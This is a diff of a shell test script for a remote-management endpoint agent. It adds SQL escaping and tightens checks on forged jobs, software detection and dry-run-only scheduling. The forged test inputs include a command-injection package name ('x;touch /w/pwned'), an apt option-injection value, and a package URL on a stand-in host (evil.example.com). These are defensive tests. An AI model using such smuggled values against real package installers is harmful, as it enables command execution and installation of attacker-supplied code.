@@ -187,9 +187,10 @@ chk "after the lock is released the retry succeeds" '[ "$(job_done $J 180)" = su
 
 echo "== jobs forged AROUND the server: the agent validates again"
 forge() { # forge TYPE PARAMS-JSON -> job id (rows written straight into the queue, so the server signs them as if it had made them)
+  local pj; pj="$(printf '%s' "$2" | sed 's/\\/\\\\/g')"   # a backslash is an escape in an SQL string
   local id; id="$(php -r 'echo sprintf("%08x-%04x-4%03x-8%03x-%012x", random_int(0, 0xffffffff), random_int(0, 0xffff), random_int(0, 0xfff), random_int(0, 0xfff), random_int(0, 0xffffffffffff));')"
   dbq "INSERT INTO endpoint_agent_jobs (job_id, device_id, asset_id, client_id, type, params_json, timeout_s, max_output_bytes, destructive, run_as, state, attempt, issued_at, expires_at, created_by, created_at)
-       SELECT '$id', device_id, asset_id, client_id, '$1', '$2', 300, 65536, 1, 'SYSTEM', 'queued', 1, UTC_TIMESTAMP(), DATE_ADD(UTC_TIMESTAMP(), INTERVAL 1 HOUR), 1, UTC_TIMESTAMP() FROM endpoint_agent_devices WHERE device_id = $DEV" >/dev/null
+       SELECT '$id', device_id, asset_id, client_id, '$1', '$pj', 300, 65536, 1, 'SYSTEM', 'queued', 1, UTC_TIMESTAMP(), DATE_ADD(UTC_TIMESTAMP(), INTERVAL 1 HOUR), 1, UTC_TIMESTAMP() FROM endpoint_agent_devices WHERE device_id = $DEV" >/dev/null
   echo "$id"
 }
 for P in '{"action":"install","mode":"run","fmt":"apt","pkg":"-oAPT::Foo"}' '{"action":"install","mode":"run","fmt":"apt","pkg":"x;touch /w/pwned"}' '{"action":"install","mode":"run","fmt":"apt","pkg":"rivetit-dummy","url":"https://evil.example.com/x.deb","sha256":"'"$(printf 'a%.0s' $(seq 64))"'","size":5}' \
@@ -200,7 +201,8 @@ done
 JID="$(forge software_detect '{"rules":"[{\"key\":\"p1\",\"kind\":\"package\",\"value\":\"-oAPT::Foo\",\"min\":\"\"}]"}')"
 chk "a forged detection rule with an option-looking package name is refused by the agent" '[ "$(job_done $JID 90)" = failed ] && jout $JID | grep -q invalid_params'
 JID="$(forge software_detect '{"rules":"[{\"key\":\"p1\",\"kind\":\"package\",\"value\":\"rivetit-other\",\"min\":\"\"},{\"key\":\"p2\",\"kind\":\"package\",\"value\":\"rivetit-dummy\",\"min\":\"\"}]"}')"
-chk "a valid detection answers per rule: other installed, dummy not" '[ "$(job_done $JID 60)" = succeeded ] && jout $JID | php -r '"'"'$j=json_decode(stream_get_contents(STDIN),true); exit($j["items"][0]["installed"] === true && $j["items"][1]["installed"] === false ? 0 : 1);'"'"''
+ST="$(job_done $JID 60)"; echo "   detection output: $(jout $JID | cut -c1-400)"
+chk "a valid detection answers per rule: other installed, dummy not" '[ "$(job_done $JID 60)" = succeeded ] && jout $JID | grep -q "\"key\":\"p1\",\"installed\":true" && jout $JID | grep -q "\"key\":\"p2\",\"installed\":false"'
 chk "nothing in the container was touched by the hostile parameters" '! q test -e /w/pwned'
 
 echo "== the scheduler (a housekeeping pass), not a person, does the work"
@@ -210,11 +212,13 @@ A POST software_assignments "{\"package_id\":$PKG_D,\"scope_type\":\"client\",\"
 chk "the package is assigned to the device's client (201)" '[ "$CODE" = 201 ]'
 HK="$(hk)"; echo "   housekeeping pass: $HK"
 chk "a housekeeping pass looks at the device and asks it what it has (deploy_detects_queued 1)" 'printf "%s" "$HK" | grep -q "\"deploy_detects_queued\":1" && printf "%s" "$HK" | grep -q "\"deploy_evaluated\":1"'
-wait_for 90 "[ \"\$(dbq \"SELECT detected_at IS NOT NULL FROM rmm_package_installs WHERE device_id = $DEV AND package_id = $PKG_D\")\" = 1 ]"
-A GET "$DEV/deployments"
-chk "the device is reported as missing the package" '[ "$(printf "%s" "$R" | jget counts.missing)" = 1 ] && [ "$(printf "%s" "$R" | jget packages.0.state)" = missing ]'
+DJ="$(dbq "SELECT job_id FROM rmm_package_jobs WHERE type = 'software_detect' AND source = 'scheduler' ORDER BY created_at DESC LIMIT 1")"
+chk "the detection job succeeded and its result was applied" '[ "$(job_done $DJ 90)" = succeeded ] && wait_for 30 "[ \"\$(dbq \"SELECT applied_at IS NOT NULL FROM rmm_package_jobs WHERE job_id = '"'"'$DJ'"'"'\")\" = 1 ]"'
+A GET "$DEV/deployments"; echo "   device state: $(printf '%s' "$R" | cut -c1-700)"
+chk "the device is not compliant: the package is missing (or a dry run for it is already waiting)" '[ $(( $(printf "%s" "$R" | jget counts.missing) + $(printf "%s" "$R" | jget counts.pending) )) = 1 ] && [ "$(printf "%s" "$R" | jget counts.compliant)" = 0 ]'
 HK="$(hk)"; echo "   housekeeping pass: $HK"
-chk "the pass queued a DRY RUN only (live installs are off by default)" 'printf "%s" "$HK" | grep -q "\"deploy_dry_runs_queued\":1" && printf "%s" "$HK" | grep -q "\"deploy_installs_queued\":0"'
+wait_for 90 "[ \"\$(dbq \"SELECT COUNT(*) FROM rmm_package_jobs p JOIN endpoint_agent_jobs j ON j.job_id = p.job_id WHERE p.source = 'scheduler' AND p.mode = 'dry_run' AND j.state = 'succeeded' AND p.applied_at IS NOT NULL\")\" = 1 ]"
+chk "the scheduler queued exactly one DRY RUN and no real install (live installs are off by default)" '[ "$(dbq "SELECT COUNT(*) FROM rmm_package_jobs WHERE source = '"'"'scheduler'"'"' AND mode = '"'"'dry_run'"'"'")" = 1 ] && [ "$(dbq "SELECT COUNT(*) FROM rmm_package_jobs WHERE source = '"'"'scheduler'"'"' AND mode = '"'"'run'"'"'")" = 0 ]'
 wait_for 90 "[ \"\$(dbq \"SELECT COUNT(*) FROM rmm_package_jobs p JOIN endpoint_agent_jobs j ON j.job_id = p.job_id WHERE p.source = 'scheduler' AND p.mode = 'dry_run' AND j.state = 'succeeded' AND p.applied_at IS NOT NULL\")\" = 1 ]"
 chk "...and nothing was installed" '! installed rivetit-dummy'
 HK="$(hk)"
